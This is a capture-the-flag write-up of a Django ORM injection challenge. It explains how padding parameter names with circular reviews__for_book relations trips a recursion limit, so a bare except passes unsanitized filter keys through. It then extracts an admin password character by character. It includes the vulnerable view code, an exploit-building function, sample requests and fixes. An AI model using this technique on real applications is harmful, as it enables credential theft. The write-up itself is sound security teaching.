# ORMT — CyberGamesWorld 2026 Writeup

**Category:** Offensive Security / Web  
**Points:** 100  
**Flag:** ``

---

## 1. Challenge Overview

> A local bookstore has deployed a new online library system. The application lets users browse books, view details, and search the catalogue using a custom lookup feature. Your objective is to gain access to the admin area and retrieve the flag.

We are given the full source code of a **Django** web application (a bookstore) and a target URL. The `/admin` endpoint returns the flag, but it requires **HTTP Basic Auth** with the `Admin` user's credentials (role must be `"admin"`).

The admin password is a **32-character random string** generated at migration time — no way to guess it. We need to **extract it from the database** through a vulnerability.

---

## 2. Source Code Analysis

### 2.1 The Data Model (`models.py`)

```
SiteUser  ──┐
  - username     │
  - password     │  (plaintext!)
  - role         │
                 │
Author ──────┘ (OneToOne → SiteUser via user_account)

Book
  - author → Author (ForeignKey)
  - title, picture, price, description

Review
  - by_user  → SiteUser (ForeignKey)
  - for_book → Book     (ForeignKey, related_name='reviews')
```

**Key relationships for traversal:**
- `Book.reviews` → `Review` (reverse FK via `related_name='reviews'`)
- `Review.by_user` → `SiteUser`
- `Review.for_book` → `Book`

This means from a `Book`, we can reach `SiteUser.password` via:
```
Book → reviews → by_user → password
```

### 2.2 The Seed Data (`0002_seed_data.py`)

```python
admin_user = siteuser_model.objects.get_or_create(
    username='Admin',
    password=''.join(secrets.choice(alphabet) for _ in range(32)),
    role='admin'
)
```

- Admin password: 32 random chars from `[a-zA-Z0-9]` — **unguessable**.
- The Admin user **wrote a review** on "The Rust Programming Language" — this is crucial for targeting.

### 2.3 The Vulnerable Endpoint (`views.py` — `book_lookup`)

```python
def clean(filter, depth=0):
    if depth == 25:
        raise RecursionError
    if filter.find('__') != -1:
        return clean(filter.replace('__', '_', 1), depth+1)
    return filter.replace('_', '__', 1)

@csrf_exempt
def book_lookup(request):
    if request.method == 'POST':
        filters = {}
        for filter in request.POST:
            if request.POST[filter] == '':
                continue
            try:
                filters[clean(filter)] = request.POST[filter]
            except:
                filters[filter] = request.POST[filter]   # ← RAW param used!
        try:
            finds = Book.objects.filter(**filters)
        except Exception:
            return render(request, 'lookup.html')
        return render(request, 'lookup.html', {'books': finds})
```

This is where the vulnerability lives. Let me break it down.

### 2.4 The Admin Endpoint (`views.py`)

```python
@siteuser_basic_auth(required_role="admin", realm="Admin Area")
def admin(request):
    return HttpResponse('SK-CERT{test_flag}')
```

Protected by HTTP Basic Auth against the `SiteUser` table (not Django's built-in auth). We need `username=Admin` and the correct `password`.

---

## 3. Finding the Vulnerability

### 3.1 Understanding Django ORM Lookups

Django's ORM uses `__` (double underscore) to traverse relationships and apply field lookups:

```python
# Traverse: Book → author → name, with "contains" lookup
Book.objects.filter(author__name__contains="Vincent")

# Traverse: Book → reviews → by_user → password
Book.objects.filter(reviews__by_user__password="secret")
```

If user input is passed directly as keyword arguments to `.filter()`, an attacker can traverse any relationship chain and read any field — this is called **ORM Injection** or **ORM Relation Traversal**.

### 3.2 The `clean()` "Sanitizer"

The developer knew about this risk and wrote `clean()` to prevent it:

```python
def clean(filter, depth=0):
    if depth == 25:
        raise RecursionError          # Step 1: Bail at depth 25
    if filter.find('__') != -1:
        return clean(filter.replace('__', '_', 1), depth+1)  # Step 2: Collapse __ → _
    return filter.replace('_', '__', 1)  # Step 3: Restore first _ → __
```

**What it does:**
1. Recursively replaces every `__` with `_` (one at a time)
2. When no `__` remains, restores the **first** `_` back to `__`
3. Result: only **one** `__` separator survives → limits to a single traversal level

**Example:** `author__name__contains` → collapses to `author_name_contains` → restores to `author__name_contains` — only one `__`, so no deeper traversal.

### 3.3 The Bypass — RecursionError at Depth 25

Here's the critical flaw:

```python
if depth == 25:
    raise RecursionError    # Raised after 25 recursive calls
```

And in `book_lookup`:

```python
try:
    filters[clean(filter)] = request.POST[filter]
except:                          # Bare except catches RecursionError!
    filters[filter] = request.POST[filter]   # Uses RAW, UNSANITIZED param!
```

**If the parameter name has 25 or more `__` separators**, `clean()` recurses 25 times, hits the depth limit, raises `RecursionError`, and the **bare `except` block catches it** — then uses the **original, unmodified parameter name** directly as the ORM filter key.

This completely **bypasses the sanitizer**.

---

## 4. Building the Exploit

### 4.1 The Traversal Chain

We need to reach `SiteUser.password` from `Book`. The chain:

```
Book → reviews → Review → by_user → SiteUser → password
```

In Django ORM syntax: `reviews__by_user__password`

But we need a lookup type for blind extraction: `reviews__by_user__password__startswith`

That's only **4** `__` separators — we need **≥ 25** to trigger the bypass.

### 4.2 Padding with Circular Traversals

The `Review` model has `for_book → Book` and `Book` has `reviews → Review`. This creates a **circular relationship**:

```
Book → reviews → Review → for_book → Book → reviews → Review → for_book → Book → ...
```

Each `reviews__for_book` cycle adds 2 `__` separators and brings us **back to Book** — a semantic no-op that inflates the depth counter!

**Final parameter:**

```
reviews__for_book__reviews__for_book__reviews__for_book__...  (repeat N times)
...__reviews__by_user__password__startswith
```

With enough cycles to get ≥ 25 `__` separators total.

### 4.3 Targeting the Admin User

The seed data tells us the Admin user reviewed **"The Rust Programming Language"**. So we add a second filter:

```
title__icontains = "Rust"
```

This ensures `Book.objects.filter()` only matches the Rust book, whose review was written by Admin. The password traversal then extracts **only the Admin's password**.

### 4.4 Blind Character-by-Character Extraction

Since we can't see the password directly, we use `__startswith` for blind extraction:

1. Try `password__startswith = "a"`, `"b"`, `"c"`, ...
2. If the book appears in the results → the prefix matches
3. Once we find the first char (e.g., `"b"`), try `"ba"`, `"bb"`, `"bc"`, ...
4. Repeat for all 32 characters

**Oracle:** If the response contains `book_card` (a CSS class in the template), the book matched → the password prefix is correct.

### 4.5 Speeding It Up

The password is 32 chars from `[a-zA-Z0-9]` (62 possible chars). Sequential extraction would require ~32 × 31 ≈ 992 requests on average.

We use **concurrent requests** (10 threads) to test multiple characters in parallel, reducing wall-clock time by ~10x.

---

## 5. The Exploit Code

```python
def build_param(tail_parts):
    """Pad with reviews__for_book cycles to reach 25+ __ separators."""
    tail_count = len(tail_parts)
    n_cycles = (26 - tail_count + 1) // 2
    parts = []
    for _ in range(n_cycles):
        parts.extend(["reviews", "for_book"])  # Circular: Book→Review→Book
    parts.extend(tail_parts)                    # Final: →Review→SiteUser→password
    return "__".join(parts)

PASSWORD_PARAM = build_param(["reviews", "by_user", "password", "startswith"])
# Result: reviews__for_book__reviews__for_book__...__reviews__by_user__password__startswith
# (25+ double underscores → triggers RecursionError → bypass!)
```

**Each request:**
```
POST /book_lookup
Content-Type: application/x-www-form-urlencoded

title__icontains=Rust&reviews__for_book__reviews__for_book__...__reviews__by_user__password__startswith=b5sm
```

**If the book shows up** → prefix `b5sm` is correct → continue to next char.

---

## 6. Exploitation Result

```
Extracted password: b5smYOfLCM74HY542T5cVoPWLb9UDExF
```

Then authenticate to `/admin`:

```
GET /admin
Authorization: Basic QWRtaW46YjVzbVlPZkxDTTc0SFk1NDJUNWN Wb1BXTGI5VURFeEY=
```

Response:
```
Congrats, SK-CERT{0rm_r3l4t10n_tr4v3rs4l_g0t_y0u}
```

---

## 7. Key Takeaways

### What made this exploitable:

| Factor | Why it matters |
|--------|---------------|
| **Bare `except:` with fallback** | Catches `RecursionError` and uses the raw, unsanitized input — the core bypass |
| **Recursive depth limit (25)** | Makes the bypass trivially triggerable by padding with enough `__` |
| **Circular FK relationships** | `Book ↔ Review` cycle lets us pad `__` count without changing the query semantics |
| **Plaintext passwords** | `SiteUser.password` stored in plain text — if hashed, extraction would be useless |
| **`__startswith` lookup** | Django's ORM lookups enable blind, character-by-character extraction |
| **Admin left a review** | Creates a `Review` linking `Book` → `SiteUser(Admin)`, making the traversal chain valid |
| **No CSRF protection** | `@csrf_exempt` on `book_lookup` allows easy scripted POST requests |

### How to fix:

1. **Allowlist parameters** — only accept known field names (`title`, `price`, etc.)
2. **Never use bare `except:`** — at minimum, don't fall back to unsanitized input
3. **Hash passwords** — even if leaked through ORM, hashed passwords resist extraction
4. **Avoid passing user input directly to `.filter(**kwargs)`** — this is the root cause of all ORM injection vulnerabilities

---

## 8. MITRE ATT&CK / CWE References

- **CWE-943**: Improper Neutralization of Special Elements in Data Query Logic (ORM Injection)
- **CWE-522**: Insufficiently Protected Credentials (plaintext passwords)
- **CWE-755**: Improper Handling of Exceptional Conditions (bare except with dangerous fallback)
